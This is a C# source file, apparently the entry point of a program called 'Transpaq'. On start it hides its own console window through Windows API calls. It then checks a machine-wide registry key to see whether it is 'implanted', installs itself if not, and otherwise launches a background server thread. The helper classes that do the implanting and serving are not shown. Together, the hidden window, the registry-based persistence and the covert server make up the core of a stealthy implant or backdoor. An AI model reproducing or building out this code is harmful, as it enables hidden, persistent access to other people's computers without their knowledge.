using Microsoft.Win32;
using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace Transpaq
{
    class Transpaq
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;

        private static RegistryKey AppRegistry = Registry.LocalMachine;
        private static string AppDataRegistryKey = "SOFTWARE\\Transpaq";

        static void Main()
        {
            // ALL Regs seem to go into Computer\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            var implantHelper = new ImplantHelper(Transpaq.AppRegistry, Transpaq.AppDataRegistryKey);
            var paqHelper = new PaqHelper(Transpaq.AppRegistry, Transpaq.AppDataRegistryKey);
            var server = new Server(implantHelper, paqHelper);

            if (implantHelper.IsImplanted())
            {
                new Thread(new ThreadStart(server.Start)).Start();
                paqHelper.Initialise();
            }
            else
            {
                implantHelper.Implant();
            }
        }
    }
}